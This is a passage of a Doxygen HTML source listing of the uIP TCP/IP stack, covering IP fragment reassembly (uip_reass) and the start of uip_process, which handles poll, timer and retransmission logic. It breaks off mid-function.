<a name="l00551"></a>00551 
<a name="l00552"></a>00552 <span class="preprocessor">#define IP_MF   0x20</span>
<a name="l00553"></a>00553 <span class="preprocessor"></span>
<a name="l00554"></a>00554 <span class="keyword">static</span> <a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a>
<a name="l00555"></a>00555 uip_reass(<span class="keywordtype">void</span>)
<a name="l00556"></a>00556 {
<a name="l00557"></a>00557   <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> offset, len;
<a name="l00558"></a>00558   <a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> i;
<a name="l00559"></a>00559 
<a name="l00560"></a>00560   <span class="comment">/* If ip_reasstmr is zero, no packet is present in the buffer, so we</span>
<a name="l00561"></a>00561 <span class="comment">     write the IP header of the fragment into the reassembly</span>
<a name="l00562"></a>00562 <span class="comment">     buffer. The timer is updated with the maximum age. */</span>
<a name="l00563"></a>00563   <span class="keywordflow">if</span>(uip_reasstmr == 0) {
<a name="l00564"></a>00564     memcpy(uip_reassbuf, &amp;<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vhl, <a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a>);
<a name="l00565"></a>00565     uip_reasstmr = <a class="code" href="a00153.html#gc3882366feda1cb759ccbfe98327a7db">UIP_REASS_MAXAGE</a>;
<a name="l00566"></a>00566     uip_reassflags = 0;
<a name="l00567"></a>00567     <span class="comment">/* Clear the bitmap. */</span>
<a name="l00568"></a>00568     memset(uip_reassbitmap, 0, <span class="keyword">sizeof</span>(uip_reassbitmap));
<a name="l00569"></a>00569   }
<a name="l00570"></a>00570 
<a name="l00571"></a>00571   <span class="comment">/* Check if the incoming fragment matches the one currently present</span>
<a name="l00572"></a>00572 <span class="comment">     in the reasembly buffer. If so, we proceed with copying the</span>
<a name="l00573"></a>00573 <span class="comment">     fragment into the buffer. */</span>
<a name="l00574"></a>00574   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr[0] == <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>-&gt;srcipaddr[0] &amp;&amp;
<a name="l00575"></a>00575      <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr[1] == <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>-&gt;srcipaddr[1] &amp;&amp;
<a name="l00576"></a>00576      <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr[0] == <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>-&gt;destipaddr[0] &amp;&amp;
<a name="l00577"></a>00577      <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr[1] == <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>-&gt;destipaddr[1] &amp;&amp;
<a name="l00578"></a>00578      <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipid[0] == <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>-&gt;ipid[0] &amp;&amp;
<a name="l00579"></a>00579      <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipid[1] == <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>-&gt;ipid[1]) {
<a name="l00580"></a>00580 
<a name="l00581"></a>00581     len = (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] &lt;&lt; 8) + <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] - (<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vhl &amp; 0x0f) * 4;
<a name="l00582"></a>00582     offset = (((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[0] &amp; 0x3f) &lt;&lt; 8) + <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[1]) * 8;
<a name="l00583"></a>00583 
<a name="l00584"></a>00584     <span class="comment">/* If the offset or the offset + fragment length overflows the</span>
<a name="l00585"></a>00585 <span class="comment">       reassembly buffer, we discard the entire packet. */</span>
<a name="l00586"></a>00586     <span class="keywordflow">if</span>(offset &gt; UIP_REASS_BUFSIZE ||
<a name="l00587"></a>00587        offset + len &gt; UIP_REASS_BUFSIZE) {
<a name="l00588"></a>00588       uip_reasstmr = 0;
<a name="l00589"></a>00589       <span class="keywordflow">goto</span> nullreturn;
<a name="l00590"></a>00590     }
<a name="l00591"></a>00591 
<a name="l00592"></a>00592     <span class="comment">/* Copy the fragment into the reassembly buffer, at the right</span>
<a name="l00593"></a>00593 <span class="comment">       offset. */</span>
<a name="l00594"></a>00594     memcpy(&amp;uip_reassbuf[<a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a> + offset],
<a name="l00595"></a>00595            (<span class="keywordtype">char</span> *)<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a> + (<span class="keywordtype">int</span>)((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;vhl &amp; 0x0f) * 4),
<a name="l00596"></a>00596            len);
<a name="l00597"></a>00597       
<a name="l00598"></a>00598     <span class="comment">/* Update the bitmap. */</span>
<a name="l00599"></a>00599     <span class="keywordflow">if</span>(offset / (8 * 8) == (offset + len) / (8 * 8)) {
<a name="l00600"></a>00600       <span class="comment">/* If the two endpoints are in the same byte, we only update</span>
<a name="l00601"></a>00601 <span class="comment">         that byte. */</span>
<a name="l00602"></a>00602              
<a name="l00603"></a>00603       uip_reassbitmap[offset / (8 * 8)] |=
<a name="l00604"></a>00604              bitmap_bits[(offset / 8 ) &amp; 7] &amp;
<a name="l00605"></a>00605              ~bitmap_bits[((offset + len) / 8 ) &amp; 7];
<a name="l00606"></a>00606     } <span class="keywordflow">else</span> {
<a name="l00607"></a>00607       <span class="comment">/* If the two endpoints are in different bytes, we update the</span>
<a name="l00608"></a>00608 <span class="comment">         bytes in the endpoints and fill the stuff inbetween with</span>
<a name="l00609"></a>00609 <span class="comment">         0xff. */</span>
<a name="l00610"></a>00610       uip_reassbitmap[offset / (8 * 8)] |=
<a name="l00611"></a>00611         bitmap_bits[(offset / 8 ) &amp; 7];
<a name="l00612"></a>00612       <span class="keywordflow">for</span>(i = 1 + offset / (8 * 8); i &lt; (offset + len) / (8 * 8); ++i) {
<a name="l00613"></a>00613         uip_reassbitmap[i] = 0xff;
<a name="l00614"></a>00614       }
<a name="l00615"></a>00615       uip_reassbitmap[(offset + len) / (8 * 8)] |=
<a name="l00616"></a>00616         ~bitmap_bits[((offset + len) / 8 ) &amp; 7];
<a name="l00617"></a>00617     }
<a name="l00618"></a>00618     
<a name="l00619"></a>00619     <span class="comment">/* If this fragment has the More Fragments flag set to zero, we</span>
<a name="l00620"></a>00620 <span class="comment">       know that this is the last fragment, so we can calculate the</span>
<a name="l00621"></a>00621 <span class="comment">       size of the entire packet. We also set the</span>
<a name="l00622"></a>00622 <span class="comment">       IP_REASS_FLAG_LASTFRAG flag to indicate that we have received</span>
<a name="l00623"></a>00623 <span class="comment">       the final fragment. */</span>
<a name="l00624"></a>00624 
<a name="l00625"></a>00625     <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[0] &amp; IP_MF) == 0) {
<a name="l00626"></a>00626       uip_reassflags |= UIP_REASS_FLAG_LASTFRAG;
<a name="l00627"></a>00627       uip_reasslen = offset + len;
<a name="l00628"></a>00628     }
<a name="l00629"></a>00629     
<a name="l00630"></a>00630     <span class="comment">/* Finally, we check if we have a full packet in the buffer. We do</span>
<a name="l00631"></a>00631 <span class="comment">       this by checking if we have the last fragment and if all bits</span>
<a name="l00632"></a>00632 <span class="comment">       in the bitmap are set. */</span>
<a name="l00633"></a>00633     <span class="keywordflow">if</span>(uip_reassflags &amp; UIP_REASS_FLAG_LASTFRAG) {
<a name="l00634"></a>00634       <span class="comment">/* Check all bytes up to and including all but the last byte in</span>
<a name="l00635"></a>00635 <span class="comment">         the bitmap. */</span>
<a name="l00636"></a>00636       <span class="keywordflow">for</span>(i = 0; i &lt; uip_reasslen / (8 * 8) - 1; ++i) {
<a name="l00637"></a>00637         <span class="keywordflow">if</span>(uip_reassbitmap[i] != 0xff) {
<a name="l00638"></a>00638           <span class="keywordflow">goto</span> nullreturn;
<a name="l00639"></a>00639         }
<a name="l00640"></a>00640       }
<a name="l00641"></a>00641       <span class="comment">/* Check the last byte in the bitmap. It should contain just the</span>
<a name="l00642"></a>00642 <span class="comment">         right amount of bits. */</span>
<a name="l00643"></a>00643       <span class="keywordflow">if</span>(uip_reassbitmap[uip_reasslen / (8 * 8)] !=
<a name="l00644"></a>00644          (<a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a>)~bitmap_bits[uip_reasslen / 8 &amp; 7]) {
<a name="l00645"></a>00645         <span class="keywordflow">goto</span> nullreturn;
<a name="l00646"></a>00646       }
<a name="l00647"></a>00647 
<a name="l00648"></a>00648       <span class="comment">/* If we have come this far, we have a full packet in the</span>
<a name="l00649"></a>00649 <span class="comment">         buffer, so we allocate a pbuf and copy the packet into it. We</span>
<a name="l00650"></a>00650 <span class="comment">         also reset the timer. */</span>
<a name="l00651"></a>00651       uip_reasstmr = 0;
<a name="l00652"></a>00652       memcpy(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>, <a class="code" href="a00150.html#g96544dedc1cdc71ad2ad54bf1d5e5433">FBUF</a>, uip_reasslen);
<a name="l00653"></a>00653 
<a name="l00654"></a>00654       <span class="comment">/* Pretend to be a "normal" (i.e., not fragmented) IP packet</span>
<a name="l00655"></a>00655 <span class="comment">         from now on. */</span>
<a name="l00656"></a>00656       <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[0] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipoffset[1] = 0;
<a name="l00657"></a>00657       <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] = uip_reasslen &gt;&gt; 8;
<a name="l00658"></a>00658       <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] = uip_reasslen &amp; 0xff;
<a name="l00659"></a>00659       <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipchksum = 0;
<a name="l00660"></a>00660       <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ipchksum = ~(<a class="code" href="a00150.html#g2addf34c7d457c1a7899a7e2171ef1e9">uip_ipchksum</a>());
<a name="l00661"></a>00661 
<a name="l00662"></a>00662       <span class="keywordflow">return</span> uip_reasslen;
<a name="l00663"></a>00663     }
<a name="l00664"></a>00664   }
<a name="l00665"></a>00665 
<a name="l00666"></a>00666  nullreturn:
<a name="l00667"></a>00667   <span class="keywordflow">return</span> 0;
<a name="l00668"></a>00668 }
<a name="l00669"></a>00669 <span class="preprocessor">#endif </span><span class="comment">/* UIP_REASSEMBLY */</span>
<a name="l00670"></a>00670 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00671"></a>00671 <span class="keyword">static</span> <span class="keywordtype">void</span>
<a name="l00672"></a>00672 uip_add_rcv_nxt(<a class="code" href="a00153.html#g77570ac4fcab86864fa1916e55676da2">u16_t</a> n)
<a name="l00673"></a>00673 {
<a name="l00674"></a>00674   <a class="code" href="a00150.html#g6832e4d2d046536b6472f7ac92340f68">uip_add32</a>(<a class="code" href="a00088.html">uip_conn</a>-&gt;rcv_nxt, n);
<a name="l00675"></a>00675   <a class="code" href="a00088.html">uip_conn</a>-&gt;rcv_nxt[0] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[0];
<a name="l00676"></a>00676   <a class="code" href="a00088.html">uip_conn</a>-&gt;rcv_nxt[1] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[1];
<a name="l00677"></a>00677   <a class="code" href="a00088.html">uip_conn</a>-&gt;rcv_nxt[2] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[2];
<a name="l00678"></a>00678   <a class="code" href="a00088.html">uip_conn</a>-&gt;rcv_nxt[3] = <a class="code" href="a00151.html#g2a0cf5d86c58fab216414ce59bf1fea1">uip_acc32</a>[3];
<a name="l00679"></a>00679 }
<a name="l00680"></a>00680 <span class="comment">/*---------------------------------------------------------------------------*/</span>
<a name="l00681"></a>00681 <span class="keywordtype">void</span>
<a name="l00682"></a><a class="code" href="a00150.html#g266263ac78a1361a2b1d15741d3b0675">00682</a> <a class="code" href="a00150.html#g266263ac78a1361a2b1d15741d3b0675">uip_process</a>(<a class="code" href="a00153.html#g4caecabca98b43919dd11be1c0d4cd8e">u8_t</a> flag)
<a name="l00683"></a>00683 {
<a name="l00684"></a>00684   <span class="keyword">register</span> <span class="keyword">struct </span><a class="code" href="a00088.html">uip_conn</a> *uip_connr = <a class="code" href="a00088.html">uip_conn</a>;
<a name="l00685"></a>00685 
<a name="l00686"></a>00686 <span class="preprocessor">#if UIP_UDP</span>
<a name="l00687"></a>00687 <span class="preprocessor"></span>  <span class="keywordflow">if</span>(flag == <a class="code" href="a00150.html#g5c97ae587595b5444be80f5ecc1d3382">UIP_UDP_SEND_CONN</a>) {
<a name="l00688"></a>00688     <span class="keywordflow">goto</span> udp_send;
<a name="l00689"></a>00689   }
<a name="l00690"></a>00690 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP */</span>
<a name="l00691"></a>00691   
<a name="l00692"></a>00692   <a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a> = <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = &amp;<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a> + <a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a>];
<a name="l00693"></a>00693 
<a name="l00694"></a>00694   <span class="comment">/* Check if we were invoked because of a poll request for a</span>
<a name="l00695"></a>00695 <span class="comment">     particular connection. */</span>
<a name="l00696"></a>00696   <span class="keywordflow">if</span>(flag == <a class="code" href="a00150.html#gd605357e29affb0d3104294c90f09905">UIP_POLL_REQUEST</a>) {
<a name="l00697"></a>00697     <span class="keywordflow">if</span>((uip_connr-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> &amp; <a class="code" href="a00150.html#g13dfcb4a5f920e108253ade527a66cc2">UIP_TS_MASK</a>) == <a class="code" href="a00150.html#gae59b70658f28ee6e998eaaab05e423f">UIP_ESTABLISHED</a> &amp;&amp;
<a name="l00698"></a>00698        !<a class="code" href="a00147.html#gef14e83c046e19ab9fe9d1bbcca276c2">uip_outstanding</a>(uip_connr)) {
<a name="l00699"></a>00699         <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#gf0ed78fd2be24d849cdd5af75e3b2674">UIP_POLL</a>;
<a name="l00700"></a>00700         <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l00701"></a>00701         <span class="keywordflow">goto</span> appsend;
<a name="l00702"></a>00702     }
<a name="l00703"></a>00703     <span class="keywordflow">goto</span> drop;
<a name="l00704"></a>00704     
<a name="l00705"></a>00705     <span class="comment">/* Check if we were invoked because of the perodic timer fireing. */</span>
<a name="l00706"></a>00706   } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(flag == <a class="code" href="a00150.html#g041aea91aa6ef84dcc6cac3c51db9b2f">UIP_TIMER</a>) {
<a name="l00707"></a>00707 <span class="preprocessor">#if UIP_REASSEMBLY</span>
<a name="l00708"></a>00708 <span class="preprocessor"></span>    <span class="keywordflow">if</span>(uip_reasstmr != 0) {
<a name="l00709"></a>00709       --uip_reasstmr;
<a name="l00710"></a>00710     }
<a name="l00711"></a>00711 <span class="preprocessor">#endif </span><span class="comment">/* UIP_REASSEMBLY */</span>
<a name="l00712"></a>00712     <span class="comment">/* Increase the initial sequence number. */</span>
<a name="l00713"></a>00713     <span class="keywordflow">if</span>(++iss[3] == 0) {
<a name="l00714"></a>00714       <span class="keywordflow">if</span>(++iss[2] == 0) {
<a name="l00715"></a>00715         <span class="keywordflow">if</span>(++iss[1] == 0) {
<a name="l00716"></a>00716           ++iss[0];
<a name="l00717"></a>00717         }
<a name="l00718"></a>00718       }
<a name="l00719"></a>00719     }
<a name="l00720"></a>00720 
<a name="l00721"></a>00721     <span class="comment">/* Reset the length variables. */</span>
<a name="l00722"></a>00722     <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = 0;
<a name="l00723"></a>00723     <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l00724"></a>00724 
<a name="l00725"></a>00725     <span class="comment">/* Check if the connection is in a state in which we simply wait</span>
<a name="l00726"></a>00726 <span class="comment">       for the connection to time out. If so, we increase the</span>
<a name="l00727"></a>00727 <span class="comment">       connection's timer and remove the connection if it times</span>
<a name="l00728"></a>00728 <span class="comment">       out. */</span>
<a name="l00729"></a>00729     <span class="keywordflow">if</span>(uip_connr-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> == <a class="code" href="a00150.html#gfff0ed43201bf1e2020de1a0d6cac070">UIP_TIME_WAIT</a> ||
<a name="l00730"></a>00730        uip_connr-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> == <a class="code" href="a00150.html#g160128ab5d2ea3cc497b91ee4eb4ef99">UIP_FIN_WAIT_2</a>) {
<a name="l00731"></a>00731       ++(uip_connr-&gt;<a class="code" href="a00088.html#2d9732cf5752d30bd11cb25dc7d0c8d3">timer</a>);
<a name="l00732"></a>00732       <span class="keywordflow">if</span>(uip_connr-&gt;<a class="code" href="a00088.html#2d9732cf5752d30bd11cb25dc7d0c8d3">timer</a> == <a class="code" href="a00153.html#g2bc3b489923793759526a3181eb667fa">UIP_TIME_WAIT_TIMEOUT</a>) {
<a name="l00733"></a>00733         uip_connr-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l00734"></a>00734       }
<a name="l00735"></a>00735     } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(uip_connr-&gt;<a class="code" href="a00088.html#a5f58074435cdc180f17de69651beebd">tcpstateflags</a> != <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>) {
<a name="l00736"></a>00736       <span class="comment">/* If the connection has outstanding data, we increase the</span>
<a name="l00737"></a>00737 <span class="comment">         connection's timer and see if it has reached the RTO value</span>
<a name="l00738"></a>00738 <span class="comment">         in which case we retransmit. */</span>
<a name="l00739"></a>00739       <span class="keywordflow">if</span>(<a class="code" href="a00147.html#gef14e83c046e19ab9fe9d1bbcca276c2">uip_outstanding</a>(uip_connr)) {
<a name="l00740"></a>00740         <span class="keywordflow">if</span>(uip_connr-&gt;timer-- == 0) {
<a name="l00741"></a>00741           <span class="keywordflow">if</span>(uip_connr-&gt;nrtx == <a class="code" href="a00153.html#g67cf1e0d2324c93f332c1f020c0fe8b3">UIP_MAXRTX</a> ||
<a name="l00742"></a>00742              ((uip_connr-&gt;tcpstateflags == <a class="code" href="a00150.html#g8af482dec973db57d8b3bd3f69461488">UIP_SYN_SENT</a> ||
<a name="l00743"></a>00743                uip_connr-&gt;tcpstateflags == <a class="code" href="a00150.html#ga5e3c856b86725125d19fccc34cd9eb5">UIP_SYN_RCVD</a>) &amp;&amp;
<a name="l00744"></a>00744               uip_connr-&gt;nrtx == <a class="code" href="a00153.html#g24aa5bc36939cc9a0833e1df01478a7e">UIP_MAXSYNRTX</a>)) {
<a name="l00745"></a>00745             uip_connr-&gt;tcpstateflags = <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a>;
<a name="l00746"></a>00746 
<a name="l00747"></a>00747             <span class="comment">/* We call UIP_APPCALL() with uip_flags set to</span>
<a name="l00748"></a>00748 <span class="comment">               UIP_TIMEDOUT to inform the application that the</span>
<a name="l00749"></a>00749 <span class="comment">               connection has timed out. */</span>
<a name="l00750"></a>00750             <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#g2d3ba4b14d6d2f6576f9b547800b7945">UIP_TIMEDOUT</a>;
<a name="l00751"></a>00751             <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l00752"></a>00752 
<a name="l00753"></a>00753             <span class="comment">/* We also send a reset packet to the remote host. */</span>
<a name="l00754"></a>00754             <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g5ca559def464ef20d8b1f7d32f2f160d">TCP_RST</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l00755"></a>00755             <span class="keywordflow">goto</span> tcp_send_nodata;
<a name="l00756"></a>00756           }
<a name="l00757"></a>00757 
<a name="l00758"></a>00758           <span class="comment">/* Exponential backoff. */</span>
<a name="l00759"></a>00759           uip_connr-&gt;timer = <a class="code" href="a00153.html#g15de27b044603284f68db05a378235a7">UIP_RTO</a> &lt;&lt; (uip_connr-&gt;nrtx &gt; 4?
<a name="l00760"></a>00760                                          4:
<a name="l00761"></a>00761                                          uip_connr-&gt;nrtx);
<a name="l00762"></a>00762           ++(uip_connr-&gt;nrtx);
<a name="l00763"></a>00763           
<a name="l00764"></a>00764           <span class="comment">/* Ok, so we need to retransmit. We do this differently</span>
<a name="l00765"></a>00765 <span class="comment">             depending on which state we are in. In ESTABLISHED, we</span>
<a name="l00766"></a>00766 <span class="comment">             call upon the application so that it may prepare the</span>
<a name="l00767"></a>00767 <span class="comment">             data for the retransmit. In SYN_RCVD, we resend the</span>
<a name="l00768"></a>00768 <span class="comment">             SYNACK that we sent earlier and in LAST_ACK we have to</span>
<a name="l00769"></a>00769 <span class="comment">             retransmit our FINACK. */</span>
<a name="l00770"></a>00770           <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#3ad48284f7a91f78bb24096aad89056e">rexmit</a>);
<a name="l00771"></a>00771           <span class="keywordflow">switch</span>(uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#g13dfcb4a5f920e108253ade527a66cc2">UIP_TS_MASK</a>) {
<a name="l00772"></a>00772           <span class="keywordflow">case</span> <a class="code" href="a00150.html#ga5e3c856b86725125d19fccc34cd9eb5">UIP_SYN_RCVD</a>:
<a name="l00773"></a>00773             <span class="comment">/* In the SYN_RCVD state, we should retransmit our</span>
<a name="l00774"></a>00774 <span class="comment">               SYNACK. */</span>
<a name="l00775"></a>00775             <span class="keywordflow">goto</span> tcp_send_synack;
<a name="l00776"></a>00776             
<a name="l00777"></a>00777 <span class="preprocessor">#if UIP_ACTIVE_OPEN</span>
<a name="l00778"></a>00778 <span class="preprocessor"></span>          <span class="keywordflow">case</span> <a class="code" href="a00150.html#g8af482dec973db57d8b3bd3f69461488">UIP_SYN_SENT</a>:
<a name="l00779"></a>00779             <span class="comment">/* In the SYN_SENT state, we retransmit out SYN. */</span>
<a name="l00780"></a>00780             <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = 0;
<a name="l00781"></a>00781             <span class="keywordflow">goto</span> tcp_send_syn;
<a name="l00782"></a>00782 <span class="preprocessor">#endif </span><span class="comment">/* UIP_ACTIVE_OPEN */</span>
<a name="l00783"></a>00783             
<a name="l00784"></a>00784           <span class="keywordflow">case</span> <a class="code" href="a00150.html#gae59b70658f28ee6e998eaaab05e423f">UIP_ESTABLISHED</a>:
<a name="l00785"></a>00785             <span class="comment">/* In the ESTABLISHED state, we call upon the application</span>
<a name="l00786"></a>00786 <span class="comment">               to do the actual retransmit after which we jump into</span>
<a name="l00787"></a>00787 <span class="comment">               the code for sending out the packet (the apprexmit</span>
<a name="l00788"></a>00788 <span class="comment">               label). */</span>
<a name="l00789"></a>00789             <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#gf848ce44c810492e7a35c2d23a429f45">UIP_REXMIT</a>;
<a name="l00790"></a>00790             <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l00791"></a>00791             <span class="keywordflow">goto</span> apprexmit;
<a name="l00792"></a>00792             
<a name="l00793"></a>00793           <span class="keywordflow">case</span> <a class="code" href="a00150.html#ga533c394b1fa0030205534befa31c525">UIP_FIN_WAIT_1</a>:
<a name="l00794"></a>00794           <span class="keywordflow">case</span> <a class="code" href="a00150.html#g64d9affc680a445d708234e70450477b">UIP_CLOSING</a>:
<a name="l00795"></a>00795           <span class="keywordflow">case</span> <a class="code" href="a00150.html#gd135fb0cfdfb2c212f0f51865a3640e4">UIP_LAST_ACK</a>:
<a name="l00796"></a>00796             <span class="comment">/* In all these states we should retransmit a FINACK. */</span>
<a name="l00797"></a>00797             <span class="keywordflow">goto</span> tcp_send_finack;
<a name="l00798"></a>00798             
<a name="l00799"></a>00799           }
<a name="l00800"></a>00800         }
<a name="l00801"></a>00801       } <span class="keywordflow">else</span> <span class="keywordflow">if</span>((uip_connr-&gt;tcpstateflags &amp; <a class="code" href="a00150.html#g13dfcb4a5f920e108253ade527a66cc2">UIP_TS_MASK</a>) == <a class="code" href="a00150.html#gae59b70658f28ee6e998eaaab05e423f">UIP_ESTABLISHED</a>) {
<a name="l00802"></a>00802         <span class="comment">/* If there was no need for a retransmission, we poll the</span>
<a name="l00803"></a>00803 <span class="comment">           application for new data. */</span>
<a name="l00804"></a>00804         <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#gf0ed78fd2be24d849cdd5af75e3b2674">UIP_POLL</a>;
<a name="l00805"></a>00805         <a class="code" href="a00153.html#g41aa744caa46913b3b3aedb2a4e78546">UIP_APPCALL</a>();
<a name="l00806"></a>00806         <span class="keywordflow">goto</span> appsend;
<a name="l00807"></a>00807       }
<a name="l00808"></a>00808     }
<a name="l00809"></a>00809     <span class="keywordflow">goto</span> drop;
<a name="l00810"></a>00810   }
<a name="l00811"></a>00811 <span class="preprocessor">#if UIP_UDP</span>
<a name="l00812"></a>00812 <span class="preprocessor"></span>  <span class="keywordflow">if</span>(flag == <a class="code" href="a00150.html#gf0ccbc3bb2a3ba1ebc255c7b3fcedd24">UIP_UDP_TIMER</a>) {
<a name="l00813"></a>00813     <span class="keywordflow">if</span>(<a class="code" href="a00095.html">uip_udp_conn</a>-&gt;lport != 0) {
<a name="l00814"></a>00814       <a class="code" href="a00088.html">uip_conn</a> = <a class="code" href="a00160.html#g070d2ce7b6bb7e5c05602aa8c308d0c4">NULL</a>;
<a name="l00815"></a>00815       <a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a> = <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = &amp;<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + <a class="code" href="a00150.html#g6f2b90c597ec23f39ec716ccec11233c">UIP_IPUDPH_LEN</a>];
<a name="l00816"></a>00816       <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l00817"></a>00817       <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#gf0ed78fd2be24d849cdd5af75e3b2674">UIP_POLL</a>;
<a name="l00818"></a>00818       <a class="code" href="a00160.html#g3d768e989e308144190ae1a5ddfa9726">UIP_UDP_APPCALL</a>();
<a name="l00819"></a>00819       <span class="keywordflow">goto</span> udp_send;
<a name="l00820"></a>00820     } <span class="keywordflow">else</span> {
